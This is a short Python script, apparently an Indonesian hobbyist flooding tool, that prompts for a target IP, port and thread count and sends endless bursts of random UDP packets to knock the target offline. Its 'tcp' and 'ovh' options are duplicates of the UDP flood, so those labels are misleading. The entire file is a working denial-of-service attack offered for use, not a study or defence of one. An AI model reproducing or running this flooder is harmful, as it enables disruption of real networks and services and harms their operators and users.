#Build For Alpin
#Copyright

import random
import socket
import threading
import time
import os,sys
import random, socket, threading
import os
import getpass

os.system("clear")
choice = str(input("~ methods : "))
ip = str(input("~ ip : "))
port = int(input("~ port : "))
times = int(input(" ~ times : "))
threads = int(input(" ~ attack : "))
os.system("clear")

def  type(s):

        for c in s  +  '\n' :

              sys.stdout.write( c )

              sys.stdout.flush( )

              time.sleep(0.035)
              
type("""
BIJAKLAH MENGGUNAKAN TOOL INI 


TOOL GOIB BUATAN VilL` """)
time.sleep(2.5)

def udp():
	data = random._urandom(577)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" DOWN Cok !!! ")
		except:
			print("[!] ERROR Command")
		    
def tcp():
	data = random._urandom(577)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" DOWN Cok !!! ")
		except:
			print("[!] ERROR Command")
			
def ovh():
	data = random._urandom(577)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" DOWN Cok !!! ")
		except:
			print("[!] ERROR Command")

for y in range(threads):
	if choice == 'udp':
		th = threading.Thread(target = udp)
		th.start()
	elif choice == 'tcp':
		th = threading.Thread(target = tcp)
		th.start()
	elif choice == 'ovh':
		th = threading.Thread(target = ovh)
		th.start()